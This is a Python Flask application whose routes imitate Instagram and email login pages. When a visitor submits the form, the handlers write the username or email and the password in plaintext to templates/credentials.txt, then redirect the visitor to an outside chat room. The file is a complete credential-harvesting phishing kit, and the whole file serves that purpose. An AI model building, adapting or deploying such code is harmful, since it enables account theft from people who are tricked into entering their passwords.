# app.py
from flask import Flask, render_template, request, redirect
import logging

# Add logging configuration
logging.basicConfig(filename='app.log', level=logging.ERROR)
app = Flask(__name__)

@app.route('/', methods=['GET'])
def login_page():
    password_error = request.args.get('password_error')
    return render_template('index.html', password_error=password_error)

@app.route('/login/instagram', methods=['GET', 'POST'])
def instagram_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if len(password) < 6 or not any(char.isdigit() for char in password) or not any(char.isalpha() for char in password) or not any(char in '!$@%' for char in password):
            return 'Password must be at least 6 characters long and contain a combination of numbers, letters, and special characters (!$@%).'
        save_credentials(username, password)
        return redirect("http://tlk.io/parvanshu")
    return render_template('instagram_login.html')

@app.route('/login/email', methods=['GET', 'POST'])
def email_login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        if len(password) < 6 or not any(char.isdigit() for char in password) or not any(char.isalpha() for char in password) or not any(char in '!$@%' for char in password) or '@' not in email:
            return 'Invalid email address or password. Password must be at least 6 characters long and contain a combination of numbers, letters, and special characters (!$@%) and email must contain @.'
        save_credentials(email, password)
        return redirect("http://tlk.io/parvanshu")
    return render_template('email_login.html')

def save_credentials(username, password):
    try:
        with open('templates/credentials.txt', 'a') as file:
            file.write(f"Username: {username}, Password: {password}\n")
    except Exception as e:
        logging.error(f"Error saving credentials: {e}")

if __name__ == '__main__':
    app.run(debug=True)
